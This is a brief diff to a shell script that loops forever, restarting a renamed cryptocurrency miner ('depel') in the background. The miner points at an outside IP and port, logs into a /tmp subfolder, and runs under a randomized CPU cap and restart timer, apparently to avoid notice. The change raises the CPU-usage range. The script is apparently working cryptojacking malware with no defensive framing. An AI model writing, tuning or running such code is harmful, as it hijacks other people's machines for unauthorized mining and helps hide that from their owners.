@@ -3,7 +3,7 @@
 echo "Start"
 while (true) 
 do
- CPU=$(( 55 + $(date +%N) % 35 ))
+ CPU=$(( 70 + $(date +%N) % 25 ))
  TIM=$(( 180 + $(date +%N) % 130 ))
  pkill depel
  depel -o 185.251.39.208:44533 --rig-id=$ID -B -l /tmp/beauty/depel.log --donate-level=1 --print-time=40 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=$CPU --av=1
